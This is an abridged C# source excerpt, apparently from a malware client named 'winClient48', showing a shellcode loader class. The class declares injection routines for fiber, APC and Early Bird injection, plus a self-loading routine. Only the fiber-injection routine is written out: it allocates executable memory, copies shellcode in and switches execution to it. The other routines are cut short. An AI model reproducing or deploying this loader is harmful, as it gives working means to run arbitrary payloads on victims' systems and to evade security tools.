...
namespace winClient48
{
    internal class clsfnLoader
    {
        ...
        /// <param name="nProcId"></param>
        /// <returns></returns>
        public static (int nCode, string szMsg) fnInjectShellCode(int nMethod, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;
        ...
        public (int nCode, string szMsg) fnFiberInjection(byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;
            ...
            try
            {
                IntPtr main_fiber = WinAPI.ConvertThreadToFiber(IntPtr.Zero);
                IntPtr shellAddress = WinAPI.VirtualAlloc(IntPtr.Zero, (UInt32)abShellCode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(abShellCode, 0, shellAddress, abShellCode.Length);
                IntPtr shell_fiber = WinAPI.CreateFiber(0, shellAddress, IntPtr.Zero);
                WinAPI.SwitchToFiber(shell_fiber);
        ...
        public (int nCode, string szMsg) fnApcInjection(int nProcID, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;
        ...
        public (int nCode, string szMsg) fnEarlyBird(byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;
        ...
        public (int nCode, string szMsg) fnLoadItself()
        {
            int nCode = 0;
            string szMsg = string.Empty;
            ...
            try
            {
                string szPath = Assembly.GetExecutingAssembly().Location;
                byte[] abBytes = File.ReadAllBytes(szPath);
